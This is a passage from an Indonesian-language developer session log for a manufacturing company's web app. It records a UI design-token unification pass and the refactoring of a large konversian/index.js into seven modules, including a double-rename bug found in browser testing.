Detail lengkap + semua nilai lama/baru ada di `map-history.md` sesi kedua puluh lima. **Semua item di atas masih CSS/JS-minimal, BELUM ada satupun yang dikonfirmasi browser.**

---

## 9. System-level unification pass (sesi kedua puluh enam)

User minta audit+fix di LEVEL SISTEM (bukan per-halaman lagi) — "the entire application feels like one finished product". Ini yang dikerjain, urut dari leverage tertinggi:

1. **`.pw-nav`/`.pw-topbar`'s token block (nav.css) — sama persis kelas bug yang ketemu di kompres-pdf sesi 25, tapi di sini dampaknya JAUH lebih luas**: token-nya SELAMA INI pakai angka SPEK design.md persis (`--accent:#0070F3`, `--bg:#FAFAFA`, dst), BUKAN angka BENERAN `pnm-universal.css`. Karena `.pw-nav`+`.pw-topbar` nongol di SEMUA halaman (sidebar selalu ada, topbar breadcrumb di 4-5 halaman), drift warna ini kena SEMUA HALAMAN sekaligus, bukan cuma satu. Diganti ke angka `pnm-universal.css` yang asli (light+dark), nama variabel gak berubah. Ini kemungkinan perubahan SATU FILE dengan dampak paling luas di seluruh sesi-sesi shell-audit ini.
2. **`.pw-topbar` ditambahin ke CRUD Produk** (sebelumnya SAMA SEKALI gak punya breadcrumb bar, beda sendiri dari 4 halaman lain yang udah punya) — murni aditif, ditaruh di atas topbar internal yang udah ada, gak nyentuh elemen/JS yang udah ada.
3. **Header brand duplikat konversian dihapus** (`.header-brand`: logo + "Pionir Nusantara Manufacturing" + "Conversion Workspace") — diganti breadcrumb polos "Conversion Workspace" doang, PERSIS anti-pattern yang disebut eksplisit di design.md ("Top bar... Replaces the full brand header currently duplicated"). Dicek dulu: NOL referensi JS ke elemen-elemen itu, aman dihapus total (bukan cuma di-hide).
4. **Ketemu regresi nyata**: link "Stok" duplikat di header konversian TERNYATA udah PERNAH di-hide sesi lain (`sesi keenam belas`, CSS selector `a[href="/stok.html"]`), tapi selector-nya jadi STALE pas href-nya diganti ke `#stok` (migrasi hash-route belakangan) — jadi diam-diam nongol lagi tanpa ada yang notice. Diperbaiki (selector disamain ke href yang sekarang).
5. Link "Kembali ke Beranda" konversian ditelusuri — TERNYATA nunjuk ke route `#home` yang UDAH DIRETIRE (`router.js`: `RETIRED_REDIRECTS = {'home':'dashboard'}`) dari sesi keenam belas juga, jadi udah gak fungsional-beda dari sekadar "ke Dashboard" — link ini emang udah bener di-hide dari sesi itu juga (href masih match), gak ada perubahan baru dibutuhin, cuma dikonfirmasi ulang statusnya.
6. **Spacing rhythm**: top padding konten dashboard (24px) disamain ke 32px, matching stok/kompres-pdf yang udah 32px DAN matching angka eksplisit di skala 8pt design.md ("32 — page top padding"). Ada 2 rule terpisah yang nyetel nilai sama (satu di section KONVERSIAN dashboard, satu lagi "safeguard" belakangan) — DUA-duanya diubah bareng biar konsisten (yang kedua override yang pertama kalau cuma satu yang diubah).

**BELUM dikerjain, didokumentasikan sebagai next lever terbesar:**
- **Icon library split (Phosphor `ph-*` vs Tabler `ti-*`)** — konversian's header-right & beberapa tempat lain (session-indicator, offline-banner) masih Phosphor, sementara nav/crud-produk/export-gambar/kompres-pdf Tabler. Ini "icon treatment" yang eksplisit diminta user, TAPI swap butuh ganti nama class di puluhan titik markup + verifikasi visual tiap glyph (Phosphor dan Tabler gak 1:1 nama sama), resiko tinggi tanpa browser. Ini item PALING BESAR yang tersisa buat "satu bahasa visual".
- Konversian's header MASIH elemen `<header>` sendiri (bukan literally `.pw-topbar` component) — udah gak ada brand duplikat lagi, tapi struktur DOM-nya beda dari pola breadcrumb-bar polos di halaman lain. Konsolidasi penuh ke `.pw-topbar` butuh mikirin ulang posisi door-switch/session-indicator, di luar scope sesi ini.
- Full typography audit (h1/h2/body sizes tiap halaman vs design.md's 18/15/13px scale) belum ditelusuri sistematis — cuma spacing top-padding yang disamain sesi ini.

Detail lengkap tiap file yang diubah + alasan ada di `map-history.md` sesi kedua puluh enam. **BELUM ADA BROWSER TESTING** — token-color change di nav.css khususnya PALING PENTING buat diverifikasi visual karena dampaknya ke semua halaman sekaligus.

---

## 10. Breakup `konversian/index.js` (sesi kedua puluh tujuh)

Item roadmap dari bagian 5 ("breakup `konversian/index.js`") dikerjain sesi ini. `konversian/index.js` (9610 baris, `mount()`-nya sendiri 9385 baris SATU closure) dipecah jadi 7 file sesuai target struktur bagian 3: `realtime.js`, `clipboard.js`, `search.js`, `dictionary.js`, `set-mendekati.js`, `permintaan-rs.js`, `sph.js`. `index.js` sekarang cuma pegang `mount()`/`unmount()` + bagian yang SENGAJA belum dipecah (auth, dropzone/lampiran/gambar modal, resize/collapse panel, preferensi, status koneksi, navigasi, record-ke-sheets, dual write, modul stok, modul converter+resolve manual) — di luar 7 target file map.md, didokumentasikan di header `index.js` biar sesi berikutnya tau batasnya.

**Temuan penting sebelum eksekusi**: 630 top-level binding di `mount()`, 276 di antaranya (45%) dipakai lintas lebih dari satu "section" — bukan 22 modul yang kebetulan nempel 1 file, tapi state yang genuinely saling silang. Bahkan `sph-module.js` (yang katanya "hampir gak berubah" di draft rencana awal) ternyata eksplisit baca variabel dari `konversian.js` lewat shared scope. Karena itu breakup TIDAK pakai `import`/`export` per-fungsi (circular, gak rapi) — dipakai satu objek `S` (state bersama, dideklarasi fresh di baris pertama tiap `mount()`) yang dioper ke tiap `install*(S)`, pola yang sama kayak `window.__konvBridge` yang udah ada di file ini. Tiap `install*(S)` isinya statement ASLI dari section terkait — **logic tidak diubah sama sekali**, cuma referensi ke nama yang didefinisikan di file lain diganti jadi `S.nama`. `index.js` manggil `install*(S)` di titik yang PERSIS SAMA (urutan baris asli) dengan posisi section itu dulu, jadi urutan eksekusi runtime gak berubah.

**Cara kerja & verifikasi** (sandbox sesi ini juga gak ada akses browser/Supabase, sama kayak sesi-sesi lain — lihat catatan verifikasi bagian atas):
1. Klasifikasi 630 binding pakai AST scope analysis (`eslint-scope`), bukan regex/indentasi tebak-tebak.
2. Ke-8 file (index.js + 7 modul) diverifikasi ESM-parse valid.
3. Scope analysis ulang tiap file buat cari referensi "orphan" (nama yang ke-tinggal, resolve ke undefined) — NOL orphan ditemukan, setelah 1 bug ketemu & diperbaiki: shorthand object property (`{ foo }`) yang kalau di-rename naif jadi `{ S.foo }` (invalid syntax) — diperbaiki jadi `{ foo: S.foo }`, cuma 4 titik di seluruh file (bridge object `window.__konvBridge` + 1 tempat lain).
4. Urutan eksekusi divalidasi terpisah: dicek gak ada referensi lintas-region yang butuh nilai SEBELUM titik itu sempat dijalankan di urutan `install*(S)` yang baru (termasuk kasus `clipboard.js` yang datang dari 2 section terpisah di source asli, digabung jadi 1 pemanggilan) — NOL kasus berisiko ditemukan.
5. Isi ke-8 file di-diff balik ke isi `mount()` asli per baris — 100% cocok, gak ada baris logic yang hilang/berubah/duplikat.

**BELUM/GAK BISA diverifikasi di sini**: perilaku runtime beneran (auth flow, realtime channel, RPC Supabase, render DOM tiap tab). **WAJIB smoke-test manual di browser** — buka semua tab (Cari Cepat, Konversi, Kebutuhan RS, Clipboard, Buat SPH, Cari SET Mendekati, Dictionary), test realtime kolaborasi (2 tab bersamaan), sebelum di-deploy ke production. `index.js.PRE-BREAKUP.bak` disimpan di folder `konversian/` buat rollback cepat kalau ada yang gak beres.

**UPDATE — bug ketemu lewat testing browser beneran (user langsung), diperbaiki hari yang sama**: versi pertama breakup di atas punya bug nyata — 32 titik deklarasi variabel yang di-reassign (`stokAccessToken`, `clipboard`, `checklistItems`, dst) ke-rename DOBEL jadi `S.S.nama`. Ini **VALID secara syntax DAN lolos scope-analysis** (`S.S.nama` cuma dibaca sebagai property access berantai, bukan reference yang unresolved) — makanya lolos ke-4 lapis pengecekan otomatis sesi sebelumnya, baru ketauan pas `mount()` beneran dijalanin di browser (`TypeError: Cannot set properties of undefined`). Root cause: generator nge-rename SEMUA reference `eslint-scope` buat tiap variabel yang di-breakup, padahal salah satu "reference" itu adalah posisi INISIALISASI variabel itu sendiri — titik yang sama juga udah kena edit terpisah (hapus keyword `let`/`var` + tambah prefix `S.`), jadi ke-double. Fix: skip reference bertipe inisialisasi (`r.init === true`) di generator, PLUS ditambahin guard baru yang bikin build gagal keras (`throw`) kalau ada dua edit yang overlap di posisi yang sama — jadi kelas bug ini gak akan lolos diam-diam lagi. Ke-8 file di-generate ulang total dari generator yang sudah diperbaiki, dicek ulang lewat semua lapis verifikasi sebelumnya (syntax, orphan-reference, urutan eksekusi, content-diff) — SEMUA masih hijau setelah fix. **Pelajaran penting buat sesi berikutnya yang ngerjain breakup serupa**: parse-valid + scope-analysis-clean TIDAK CUKUP buat jenis refactor mekanis begini, karena bug seperti `S.S.nama` itu sendiri secara AST 100% legal (cuma property chain) — testing browser beneran itu WAJIB, bukan nice-to-have, dan gak bisa digantikan analisis statis sekomprehensif apapun.

---